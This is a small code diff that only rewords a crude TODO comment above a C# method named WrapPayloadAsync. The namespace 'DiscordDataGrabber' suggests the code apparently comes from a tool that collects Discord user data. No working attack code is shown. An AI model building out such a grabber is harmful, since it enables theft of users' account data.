@@ -81,7 +81,7 @@ namespace DiscordDataGrabber.Utlities
             }
         }
 
-        //SHITTY QUALITY CODE todo: fix that shit
+        //BAD QUALITY CODE todo: fix that 
         public async Task<string> WrapPayloadAsync()
         {
             var utilities = new DiscordUserUtilities();
